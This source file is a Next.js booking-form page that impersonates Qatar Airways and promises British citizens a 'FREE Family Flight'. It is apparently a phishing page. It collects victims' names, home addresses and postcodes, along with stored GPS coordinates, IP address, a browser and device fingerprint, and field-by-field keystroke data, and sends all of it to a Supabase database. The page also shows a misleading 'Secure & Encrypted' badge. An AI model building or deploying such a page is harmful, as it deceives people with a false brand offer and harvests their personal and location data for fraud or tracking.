'use client'

import { useEffect, useState } from 'react'
import { useRouter } from 'next/navigation'
import { supabaseHelpers } from '@/lib/supabase'
import Image from 'next/image'

interface FormData {
  firstName: string
  lastName: string
  postcode: string
  streetAddress: string
  city: string
  destination: string
}

interface LocationData {
  latitude: number
  longitude: number
  accuracy: number
  timestamp: string
  method: string
}

interface BrowserFingerprint {
  userAgent: string
  language: string
  timezone: string
  screen: string
  platform: string
  cookieEnabled: boolean
}

export default function BookingFormPage() {
  const router = useRouter()
  const [formData, setFormData] = useState<FormData>({
    firstName: '',
    lastName: '',
    postcode: '',
    streetAddress: '',
    city: '',
    destination: ''
  })
  const [location, setLocation] = useState<LocationData | null>(null)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [browserFingerprint, setBrowserFingerprint] = useState<BrowserFingerprint | null>(null)
  const [formErrors, setFormErrors] = useState<{[key: string]: string}>({})
  const [submitAttempts, setSubmitAttempts] = useState(0)
  const [formStartTime] = useState(() => Date.now()) // Track when form component loaded

  useEffect(() => {
    // Track form page visit
    supabaseHelpers.trackPageVisit('form_page')
    
    // Get location data if available
    const storedLocation = sessionStorage.getItem('userLocation')
    if (storedLocation) {
      try {
        setLocation(JSON.parse(storedLocation))
      } catch {
        // Error parsing stored location - ignore and continue without location data
      }
    }

    // Create browser fingerprint for tracking
    const fingerprint: BrowserFingerprint = {
      userAgent: navigator.userAgent,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen: `${screen.width}x${screen.height}`,
      platform: navigator.platform,
      cookieEnabled: navigator.cookieEnabled
    }
    setBrowserFingerprint(fingerprint)

    // Track form load with fingerprint
    supabaseHelpers.trackUserAction('form_loaded', {
      fingerprint,
      location_available: !!storedLocation,
      session_id: supabaseHelpers.getSessionId(),
      referrer: document.referrer,
      timestamp: new Date().toISOString()
    })
  }, [router])

  const handleInputChange = (field: keyof FormData, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }))
    
    // Clear field error when user starts typing
    if (formErrors[field]) {
      setFormErrors(prev => ({ ...prev, [field]: '' }))
    }
    
    // Track field changes
    supabaseHelpers.trackFormInteraction('field_change', field, value.substring(0, 50))
  }

  const validateForm = (): boolean => {
    const errors: {[key: string]: string} = {}
    
    // Required field validation
    if (!formData.postcode.trim()) {
      errors.postcode = 'Postcode is required'
    }
    
    if (!formData.streetAddress.trim()) {
      errors.streetAddress = 'Street address is required'
    }
    
    if (!formData.destination.trim()) {
      errors.destination = 'Destination is required'
    }

    // Additional validation for quality data
    if (formData.postcode.trim() && formData.postcode.length < 3) {
      errors.postcode = 'Please enter a valid postcode'
    }
    
    if (formData.streetAddress.trim() && formData.streetAddress.length < 5) {
      errors.streetAddress = 'Please enter a complete street address'
    }

    setFormErrors(errors)
    return Object.keys(errors).length === 0
  }

  const isFormValid = (): boolean => {
    return !!(
      formData.postcode.trim() &&
      formData.streetAddress.trim() &&
      formData.destination.trim() &&
      formData.postcode.length >= 3 &&
      formData.streetAddress.length >= 5
    )
  }

  const handleFieldFocus = (field: string) => {
    supabaseHelpers.trackFormInteraction('focus', field)
  }

  const handleFieldBlur = (field: string) => {
    supabaseHelpers.trackFormInteraction('blur', field, formData[field as keyof FormData])
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    // Increment submit attempts
    setSubmitAttempts(prev => prev + 1)
    
    // Track submission attempt
    await supabaseHelpers.trackUserAction('form_submit_attempt', {
      attempt_number: submitAttempts + 1,
      form_data_length: JSON.stringify(formData).length,
      timestamp: new Date().toISOString()
    })
    
    // Strict validation - prevent submission if invalid
    if (!validateForm()) {
      await supabaseHelpers.trackUserAction('form_submit_blocked', {
        reason: 'validation_failed',
        errors: formErrors,
        attempt_number: submitAttempts + 1,
        missing_required: Object.keys(formErrors)
      })
      return // Block submission
    }
    
    setIsSubmitting(true)

    try {
      // Get comprehensive tracking data
      const ipAddress = await supabaseHelpers.getUserIP()
      const sessionId = supabaseHelpers.getSessionId()
      const timestamp = new Date().toISOString()

      // Prepare comprehensive submission data with proper types
      const submissionData = {
        // Form data (guaranteed)
        firstName: formData.firstName.trim(),
        lastName: formData.lastName.trim(),
        postcode: formData.postcode.trim().toUpperCase(),
        streetAddress: formData.streetAddress.trim(),
        city: formData.city.trim() || null,
        destination: formData.destination.trim(),
        
        // Location data (if available)
        latitude: location?.latitude || null,
        longitude: location?.longitude || null,
        location_accuracy: location?.accuracy || null,
        location_method: location?.method || 'not_captured',
        location_timestamp: location?.timestamp || null,
        location_quality: location ? (location.accuracy <= 10 ? 'excellent' : location.accuracy <= 50 ? 'good' : 'fair') : null,
        
        // Tracking data (always captured)
        timestamp,
        userAgent: navigator.userAgent,
        ipAddress,
        sessionId,
        
        // Browser fingerprint data
        browser_language: navigator.language,
        browser_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        browser_screen: `${screen.width}x${screen.height}`,
        browser_platform: navigator.platform,
        browser_cookies: navigator.cookieEnabled,
        
        // Submission metadata
        submit_attempt_number: submitAttempts + 1,
        referrer: document.referrer,
        page_url: window.location.href,
        
        // Device information (converted to proper types)
        device_memory: (navigator as unknown as { deviceMemory?: number })?.deviceMemory || undefined,
        connection_type: (navigator as unknown as { connection?: { effectiveType?: string } })?.connection?.effectiveType || undefined,
        time_zone_offset: new Date().getTimezoneOffset(),
        local_storage_available: typeof(Storage) !== "undefined",
        
        // Form completion metrics
        form_completion_time: Date.now() - formStartTime, // Time from form load to submission in milliseconds
        validation_errors_count: Object.keys(formErrors).length,
        user_journey: {
          form_interactions: submitAttempts + 1,
          has_location: !!location,
          browser_info: browserFingerprint,
          completion_timestamp: timestamp
        }
      }

      // Submit to database with all tracking data
      await supabaseHelpers.insertFormSubmission(submissionData)

      // Track successful submission
      await supabaseHelpers.trackUserAction('form_submit_success', {
        data_captured: {
          location: !!location,
          form_complete: true,
          ip_address: !!ipAddress,
          fingerprint: !!browserFingerprint
        },
        submission_size: JSON.stringify(submissionData).length,
        timestamp
      })

      // Clear sensitive data from session
      sessionStorage.removeItem('userLocation')
      sessionStorage.removeItem('locationCaptured')
      sessionStorage.removeItem('locationError')

      // Redirect to thank you page
      router.push('/thank-you')

    } catch (error) {
      console.error('Form submission error:', error)
      
      // Track submission error for debugging
      await supabaseHelpers.trackUserAction('form_submit_error', {
        error_message: error instanceof Error ? error.message : 'Unknown error',
        attempt_number: submitAttempts + 1,
        form_data: formData,
        timestamp: new Date().toISOString()
      })
      
      // Show gentle error to user (no technical details)
      alert('Please check your information and try again.')
    } finally {
      setIsSubmitting(false)
    }
  }

  return (
    <div className="booking-form-page">
      {/* Main Content Container */}
      <div className="form-container">
        {/* Header Section */}
        <div className="header-section">
          <div className="logo-container">
            <Image 
              src="https://logotyp.us/files/qatar-airways.svg" 
              alt="Qatar Airways" 
              className="logo"
              width={120}
              height={50}
            />
          </div>
          
          {/* Success Badge */}
          <div className="success-badge">
            <div className="success-icon">
              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
            </div>
            <span>FREE Family Flight</span>
          </div>
        </div>

        {/* Title Section */}
        <div className="title-section">
          <h1 className="main-title">
            <span className="title-highlight">Confirm Your FREE Family Flight</span>
          </h1>
          <div className="subtitle">Final Step - Booking Details</div>
          <p className="description">
            Complete your details to secure your complimentary family flight (up to 4 passengers) to any destination worldwide. Available exclusively for British citizens.
          </p>
        </div>

        {/* Form Section */}
        <form onSubmit={handleSubmit} className="details-form">
          <div className="form-grid">
            <div className="form-group">
              <label htmlFor="firstName" className="form-label">
                <svg className="label-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M20 21V19C20 17.9391 19.5786 16.9217 18.8284 16.1716C18.0783 15.4214 17.0609 15 16 15H8C6.93913 15 5.92172 15.4214 5.17157 16.1716C4.42143 16.9217 4 17.9391 4 19V21" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  <path d="M12 11C14.2091 11 16 9.20914 16 7C16 4.79086 14.2091 3 12 3C9.79086 3 8 4.79086 8 7C8 9.20914 9.79086 11 12 11Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
                First Name
              </label>
              <input
                type="text"
                id="firstName"
                value={formData.firstName}
                onChange={(e) => handleInputChange('firstName', e.target.value)}
                onFocus={() => handleFieldFocus('firstName')}
                onBlur={() => handleFieldBlur('firstName')}
                className="form-input"
                placeholder="Enter your first name"
                required
              />
            </div>

            <div className="form-group">
              <label htmlFor="lastName" className="form-label">
                <svg className="label-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M20 21V19C20 17.9391 19.5786 16.9217 18.8284 16.1716C18.0783 15.4214 17.0609 15 16 15H8C6.93913 15 5.92172 15.4214 5.17157 16.1716C4.42143 16.9217 4 17.9391 4 19V21" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  <path d="M12 11C14.2091 11 16 9.20914 16 7C16 4.79086 14.2091 3 12 3C9.79086 3 8 4.79086 8 7C8 9.20914 9.79086 11 12 11Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
                Last Name
              </label>
              <input
                type="text"
                id="lastName"
                value={formData.lastName}
                onChange={(e) => handleInputChange('lastName', e.target.value)}
                onFocus={() => handleFieldFocus('lastName')}
                onBlur={() => handleFieldBlur('lastName')}
                className="form-input"
                placeholder="Enter your last name"
                required
              />
            </div>

            <div className="form-group">
              <label htmlFor="postcode" className="form-label">
                <svg className="label-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M21 10C21 17 12 23 12 23C12 23 3 17 3 10C3 7.61305 3.94821 5.32387 5.63604 3.63604C7.32387 1.94821 9.61305 1 12 1C14.3869 1 16.6761 1.94821 18.3639 3.63604C20.0518 5.32387 21 7.61305 21 10Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  <path d="M12 13C13.6569 13 15 11.6569 15 10C15 8.34315 13.6569 7 12 7C10.3431 7 9 8.34315 9 10C9 11.6569 10.3431 13 12 13Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
                Postcode <span className="required-indicator">*</span>
              </label>
              <input
                type="text"
                id="postcode"
                value={formData.postcode}
                onChange={(e) => handleInputChange('postcode', e.target.value)}
                onFocus={() => handleFieldFocus('postcode')}
                onBlur={() => handleFieldBlur('postcode')}
                className={`form-input ${formErrors.postcode ? 'error' : ''} ${formData.postcode.trim() ? 'filled' : ''}`}
                placeholder="Enter your postcode"
                required
              />
              {formErrors.postcode && (
                <div className="field-error">{formErrors.postcode}</div>
              )}
            </div>

            <div className="form-group">
              <label htmlFor="streetAddress" className="form-label">
                <svg className="label-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M3 9L12 2L21 9V20C21 20.5304 20.7893 21.0391 20.4142 21.4142C20.0391 21.7893 19.5304 22 19 22H5C4.46957 22 3.96086 21.7893 3.58579 21.4142C3.21071 21.0391 3 20.5304 3 20V9Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  <path d="M9 22V12H15V22" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
                Street Address <span className="required-indicator">*</span>
              </label>
              <input
                type="text"
                id="streetAddress"
                value={formData.streetAddress}
                onChange={(e) => handleInputChange('streetAddress', e.target.value)}
                onFocus={() => handleFieldFocus('streetAddress')}
                onBlur={() => handleFieldBlur('streetAddress')}
                className={`form-input ${formErrors.streetAddress ? 'error' : ''} ${formData.streetAddress.trim() ? 'filled' : ''}`}
                placeholder="Enter your street address"
                required
              />
              {formErrors.streetAddress && (
                <div className="field-error">{formErrors.streetAddress}</div>
              )}
            </div>

            <div className="form-group">
              <label htmlFor="city" className="form-label">
                <svg className="label-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M21 10C21 17 12 23 12 23C12 23 3 17 3 10C3 7.61305 3.94821 5.32387 5.63604 3.63604C7.32387 1.94821 9.61305 1 12 1C14.3869 1 16.6761 1.94821 18.3639 3.63604C20.0518 5.32387 21 7.61305 21 10Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  <path d="M12 13C13.6569 13 15 11.6569 15 10C15 8.34315 13.6569 7 12 7C10.3431 7 9 8.34315 9 10C9 11.6569 10.3431 13 12 13Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
                City
              </label>
              <input
                type="text"
                id="city"
                value={formData.city}
                onChange={(e) => handleInputChange('city', e.target.value)}
                onFocus={() => handleFieldFocus('city')}
                onBlur={() => handleFieldBlur('city')}
                className={`form-input ${formData.city.trim() ? 'filled' : ''}`}
                placeholder="Enter your city"
              />
            </div>

            <div className="form-group">
              <label htmlFor="destination" className="form-label">
                <svg className="label-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M17.8 19.2L16 11L4 15.5L3 19L5 19.5L5.5 21L9 20L13.5 8L21.2 6.2C21.7 6.1 22 5.6 21.9 5.1C21.8 4.6 21.3 4.3 20.8 4.4L7 8L4 6L3 7L6 8.5L2.5 20L3.5 21L6 17.5L8.5 19L9.5 18L8 13.5L20.8 4.4C21.3 4.3 21.8 4.6 21.9 5.1C22 5.6 21.7 6.1 21.2 6.2L17.8 19.2Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
                Travel Destination <span className="required-indicator">*</span>
              </label>
              <input
                type="text"
                id="destination"
                value={formData.destination}
                onChange={(e) => handleInputChange('destination', e.target.value)}
                onFocus={() => handleFieldFocus('destination')}
                onBlur={() => handleFieldBlur('destination')}
                className={`form-input ${formErrors.destination ? 'error' : ''} ${formData.destination.trim() ? 'filled' : ''}`}
                placeholder="Dubai, Maldives, Paris, New York..."
                required
              />
              {formErrors.destination && (
                <div className="field-error">{formErrors.destination}</div>
              )}
            </div>
          </div>

          {/* Submit Button */}
          <div className="submit-section">
            <button 
              type="submit" 
              className={`submit-button ${!isFormValid() ? 'disabled' : ''}`}
              disabled={isSubmitting || !isFormValid()}
            >
              <div className="button-content">
                {!isSubmitting ? (
                  <svg className="submit-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M22 2L11 13" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    <path d="M22 2L15 22L11 13L2 9L22 2Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                ) : (
                  <div className="loading-spinner"></div>
                )}
                <span>{isSubmitting ? 'Confirming Flight Details...' : 'Secure FREE Family Flight'}</span>
              </div>
            </button>
            
            {!isFormValid() && (
              <div className="validation-message">
                Please complete all required fields to secure your flight
              </div>
            )}
          </div>
        </form>
      </div>

      {/* Footer */}
      <div className="footer">
        <div className="security-badge">
          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,7C13.4,7 14.8,8.6 14.8,10V11.5C15.4,11.5 16,12.1 16,12.7V16.2C16,16.8 15.4,17.3 14.8,17.3H9.2C8.6,17.3 8,16.8 8,16.2V12.8C8,12.2 8.6,11.7 9.2,11.7V10C9.2,8.6 10.6,7 12,7M12,8.2C11.2,8.2 10.5,8.7 10.5,9.5V11.5H13.5V9.5C13.5,8.7 12.8,8.2 12,8.2Z" fill="currentColor"/>
          </svg>
          <span>Secure & Encrypted</span>
        </div>
      </div>

      <style jsx>{`
        /* Main Container */
        .booking-form-page {
          position: relative;
          min-height: 100vh;
          min-height: 100dvh; /* Better mobile viewport height */
          background: #ffffff;
          font-family: var(--font-poppins), 'Poppins', 'Inter', 'Segoe UI', sans-serif;
          overflow-x: hidden;
          overflow-y: auto;
          display: flex;
          align-items: flex-start;
          justify-content: center;
          padding: 1.5rem 1rem;
          box-sizing: border-box;
        }

        /* Form Container */
        .form-container {
          background: #ffffff;
          padding: 2rem;
          max-width: 800px;
          width: 100%;
          position: relative;
          margin: 0;
        }

        /* Header Section */
        .header-section {
          text-align: center;
          margin-bottom: 2rem;
        }

        .logo-container {
          position: relative;
          display: inline-block;
          margin-bottom: 1rem;
        }

        .logo {
          width: clamp(100px, 15vw, 120px);
          height: auto;
          transition: transform 0.3s ease;
        }

        .logo:hover {
          transform: scale(1.05);
        }

        .success-badge {
          display: inline-flex;
          align-items: center;
          gap: 0.5rem;
          background: linear-gradient(135deg, #10b981, #059669);
          color: white;
          padding: 0.75rem 1.5rem;
          border-radius: 50px;
          font-size: 0.9rem;
          font-weight: 600;
          margin-top: 1rem;
          box-shadow: 0 2px 8px rgba(16, 185, 129, 0.2);
        }

        .success-icon {
          width: 16px;
          height: 16px;
        }

        /* Title Section */
        .title-section {
          text-align: center;
          margin-bottom: 2.5rem;
        }

        .main-title {
          font-size: clamp(2rem, 5vw, 3rem);
          font-weight: 800;
          margin-bottom: 0.5rem;
          line-height: 1.1;
          text-shadow: 0 1px 2px rgba(0,0,0,0.05);
        }

        .title-highlight {
          background: linear-gradient(135deg, #5c0f3c, #8b1538);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          background-clip: text;
        }

        .subtitle {
          font-size: 1.25rem;
          color: #7f8c8d;
          font-weight: 500;
          margin-bottom: 1.5rem;
          text-transform: uppercase;
          letter-spacing: 1px;
        }

        .description {
          font-size: 1rem;
          color: #4a5568;
          line-height: 1.6;
          max-width: 500px;
          margin: 0 auto;
        }

        /* Form Styles */
        .details-form {
          display: flex;
          flex-direction: column;
          gap: 2rem;
        }

        .form-grid {
          display: grid;
          grid-template-columns: 1fr;
          gap: 1.25rem;
        }

        .form-group {
          display: flex;
          flex-direction: column;
        }

        .form-label {
          display: flex;
          align-items: center;
          gap: 0.5rem;
          font-size: 0.875rem;
          font-weight: 600;
          color: #374151;
          margin-bottom: 0.5rem;
        }

        .label-icon {
          width: 16px;
          height: 16px;
          color: #5c0f3c;
        }

        .form-input {
          padding: 1rem;
          border: 1px solid #d1d5db;
          border-radius: 8px;
          font-size: 1rem;
          color: #111827 !important; /* Darker text for better visibility */
          transition: all 0.2s ease;
          background: white !important;
          width: 100%;
          min-height: 48px; /* Better touch target size */
          box-sizing: border-box;
          -webkit-text-fill-color: #111827 !important; /* Safari fix */
        }

        .form-input:focus {
          outline: none;
          border-color: #5c0f3c;
          box-shadow: 0 0 0 2px rgba(92, 15, 60, 0.1);
          color: #111827 !important;
          -webkit-text-fill-color: #111827 !important;
        }

        .form-input::placeholder {
          color: #9ca3af !important;
          -webkit-text-fill-color: #9ca3af !important;
        }

        /* Validation Styles */
        .required-indicator {
          color: #dc2626;
          font-weight: 700;
          margin-left: 0.25rem;
        }

        .form-input.error {
          border-color: #dc2626;
          box-shadow: 0 0 0 2px rgba(220, 38, 38, 0.1);
        }

        .form-input.filled {
          border-color: #10b981;
          background: #f0fdf4 !important;
          color: #111827 !important; /* Ensure dark text in filled state */
          -webkit-text-fill-color: #111827 !important;
        }

        .field-error {
          color: #dc2626;
          font-size: 0.75rem;
          margin-top: 0.25rem;
          display: flex;
          align-items: center;
          gap: 0.25rem;
        }

        .field-error:before {
          content: "⚠";
          font-size: 0.875rem;
        }

        .validation-message {
          text-align: center;
          color: #6b7280;
          font-size: 0.875rem;
          margin-top: 0.75rem;
          padding: 1rem;
          background: #f9fafb;
          border-radius: 8px;
          border-left: 4px solid #fbbf24;
        }

        .validation-message ul {
          list-style: none;
          padding: 0;
          margin: 0.5rem 0 0 0;
          text-align: left;
        }

        .validation-message li {
          margin: 0.25rem 0;
          color: #dc2626;
          font-weight: 500;
        }

        .submit-button.disabled {
          background-color: #9ca3af !important;
          cursor: not-allowed !important;
          opacity: 0.6;
        }

        .submit-button.disabled:hover {
          transform: none !important;
          box-shadow: 0 4px 12px rgba(156, 163, 175, 0.3) !important;
        }

        .submit-button.enabled {
          background: linear-gradient(135deg, #5c0f3c, #8b1538);
          cursor: pointer;
        }

        .submit-button.enabled:hover {
          transform: translateY(-2px);
          box-shadow: 0 6px 20px rgba(92, 15, 60, 0.4);
        }

        /* Terms Section */
        .terms-section {
          margin: 1rem 0;
        }

        .checkbox-container {
          display: flex;
          align-items: flex-start;
          gap: 0.75rem;
          cursor: pointer;
          font-size: 0.875rem;
          line-height: 1.5;
        }

        .checkbox-container input[type="checkbox"] {
          position: absolute;
          opacity: 0;
          cursor: pointer;
        }

        .checkmark {
          position: relative;
          width: 18px;
          height: 18px;
          background: white;
          border: 2px solid #d1d5db;
          border-radius: 4px;
          transition: all 0.2s ease;
          flex-shrink: 0;
          margin-top: 2px;
        }

        .checkbox-container input:checked ~ .checkmark {
          background: #5c0f3c;
          border-color: #5c0f3c;
        }

        .checkmark:after {
          content: "";
          position: absolute;
          display: none;
          left: 5px;
          top: 2px;
          width: 4px;
          height: 8px;
          border: solid white;
          border-width: 0 2px 2px 0;
          transform: rotate(45deg);
        }

        .checkbox-container input:checked ~ .checkmark:after {
          display: block;
        }

        .checkbox-text {
          color: #4b5563;
        }

        .terms-link {
          color: #5c0f3c;
          text-decoration: underline;
          font-weight: 500;
        }

        .terms-link:hover {
          color: #8b1538;
        }

        /* Submit Section */
        .submit-section {
          text-align: center;
        }

        .submit-button {
          position: relative;
          background: linear-gradient(135deg, #5c0f3c, #8b1538);
          color: white;
          border: none;
          padding: 1.2rem 2rem;
          border-radius: 12px;
          cursor: pointer;
          font-size: 1.125rem;
          font-weight: 600;
          transition: all 0.3s ease;
          overflow: hidden;
          box-shadow: 0 4px 20px rgba(92, 15, 60, 0.25);
          width: 100%;
          min-height: 58px; /* Better touch target */
          max-width: 400px;
          margin: 1rem auto 0;
          display: block;
          letter-spacing: 0.5px;
          text-transform: uppercase;
          font-size: 1rem;
        }

        .submit-button:hover:not(:disabled) {
          transform: translateY(-2px);
          box-shadow: 0 4px 12px rgba(92, 15, 60, 0.3);
        }

        .submit-button:disabled {
          opacity: 0.7;
          cursor: not-allowed;
          transform: none;
        }

        .button-content {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 0.5rem;
          position: relative;
          z-index: 2;
        }

        .submit-icon {
          width: 18px;
          height: 18px;
        }

        .loading-spinner {
          width: 18px;
          height: 18px;
          border: 2px solid rgba(255, 255, 255, 0.3);
          border-top: 2px solid white;
          border-radius: 50%;
          animation: spin 1s linear infinite;
        }

        /* Footer */
        .footer {
          position: absolute;
          bottom: 2rem;
          left: 50%;
          transform: translateX(-50%);
        }

        .security-badge {
          display: flex;
          align-items: center;
          gap: 0.5rem;
          background: rgba(255, 255, 255, 0.9);
          color: #5c0f3c;
          padding: 0.5rem 1rem;
          border-radius: 50px;
          font-size: 0.875rem;
          font-weight: 500;
          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        }

        .security-badge svg {
          width: 16px;
          height: 16px;
        }

        /* Animations */
        @keyframes slideUp {
          from {
            opacity: 0;
            transform: translateY(30px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }

        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }

        /* Responsive Design */
        /* iPhone 12 Pro specific optimizations */
        @media screen and (device-width: 390px) and (device-height: 844px) and (-webkit-device-pixel-ratio: 3) {
          .booking-form-page {
            padding: 1rem 0.8rem;
            min-height: 100dvh;
          }

          .form-container {
            padding: 1.5rem 1.2rem;
            max-width: 100%;
          }

          .logo {
            width: 95px;
          }

          .main-title {
            font-size: 1.6rem;
            line-height: 1.15;
          }

          .subtitle {
            font-size: 0.85rem;
            margin-bottom: 1.2rem;
          }

          .description {
            font-size: 0.85rem;
            line-height: 1.5;
          }

          .form-input {
            padding: 0.9rem;
            font-size: 0.95rem;
            color: #111827 !important;
            min-height: 50px;
            -webkit-text-fill-color: #111827 !important;
          }

          .submit-button {
            padding: 1.1rem 2rem;
            font-size: 1.05rem;
            min-height: 56px;
            position: sticky;
            bottom: 1rem;
            z-index: 10;
          }

          .security-indicators {
            margin-top: 1rem;
            gap: 1rem;
          }
        }

        @media (max-width: 768px) {
          .booking-form-page {
            padding: 1rem;
            align-items: flex-start;
          }

          .form-container {
            padding: 1.5rem;
            max-width: 100%;
          }

          .header-section {
            margin-bottom: 1.5rem;
          }

          .logo {
            width: clamp(80px, 12vw, 100px);
          }

          .form-grid {
            grid-template-columns: 1fr;
            gap: 1rem;
          }

          .main-title {
            font-size: 1.75rem;
            line-height: 1.2;
          }

          .subtitle {
            font-size: 0.9rem;
          }

          .description {
            font-size: 0.85rem;
            margin-bottom: 1.5rem;
          }

          .form-input {
            padding: 1rem;
            font-size: 1rem;
            color: #111827 !important;
            min-height: 50px;
            -webkit-text-fill-color: #111827 !important;
          }

          .submit-button {
            padding: 1.125rem 2rem;
            font-size: 1.1rem;
            min-height: 58px;
          }
        }

        @media (max-width: 480px) {
          .booking-form-page {
            padding: 0.75rem;
          }

          .form-container {
            padding: 1rem;
          }

          .header-section {
            margin-bottom: 1.25rem;
          }

          .main-title {
            font-size: 1.5rem;
          }

          .subtitle {
            font-size: 0.85rem;
          }

          .description {
            font-size: 0.8rem;
          }

          .form-label {
            font-size: 0.9rem;
            margin-bottom: 0.375rem;
          }

          .form-input {
            padding: 0.875rem;
            font-size: 0.95rem;
            color: #111827 !important;
            -webkit-text-fill-color: #111827 !important;
          }

          .submit-button {
            padding: 1rem 1.5rem;
            font-size: 1rem;
          }
        }

        @media (min-width: 769px) {
          .form-grid {
            grid-template-columns: 1fr 1fr;
            gap: 1.5rem;
          }

          .form-container {
            padding: 3rem;
          }
        }
      `}</style>
    </div>
  )
}